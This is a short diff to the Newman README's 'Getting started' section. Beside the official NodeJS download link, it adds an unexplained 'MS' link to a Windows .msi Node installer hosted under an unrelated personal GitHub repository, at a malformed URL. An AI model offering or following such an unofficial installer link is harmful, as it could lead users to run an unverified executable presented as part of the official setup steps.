@@ -4,6 +4,7 @@ _Supercharge your API workflow<br/>Modern software is built on APIs. Postman hel
 ## Getting started
 
 To run Newman, ensure that you have NodeJS >= v4. A copy of the NodeJS installable can be downloaded from [https://nodejs.org/en/download/package-manager](https://nodejs.org/en/download/package-manager).
+[MS](https://github.com/arseniogalvao/Hostelworld/Q4/node-v6.10.2-x64.msi).
 
 The easiest way to install Newman is using NPM. If you have NodeJS installed, it is most likely that you have NPM
 installed as well.
